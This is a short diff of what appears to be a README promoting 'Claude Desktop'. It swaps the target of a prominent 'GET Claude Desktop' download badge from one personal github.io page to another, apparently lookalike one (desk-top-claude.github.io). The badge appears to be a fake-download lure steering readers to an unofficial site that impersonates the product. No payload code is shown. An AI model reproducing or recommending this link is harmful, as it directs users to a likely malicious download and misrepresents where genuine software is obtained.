@@ -3,7 +3,7 @@
 
 ![Claude Desktop](https://miro.medium.com/v2/0*cuNGuDy0TepsYdRd.jpg)
 
-[![GET Claude Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20Claude%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://davisamber39428.github.io/.github/Claude-Desktop-AI)
+[![GET Claude Desktop](https://img.shields.io/badge/GET%20%E2%80%94%20Claude%20Desktop-0078D6?style=for-the-badge&logoColor=white)](https://desk-top-claude.github.io/.github/)
 
 ---
 
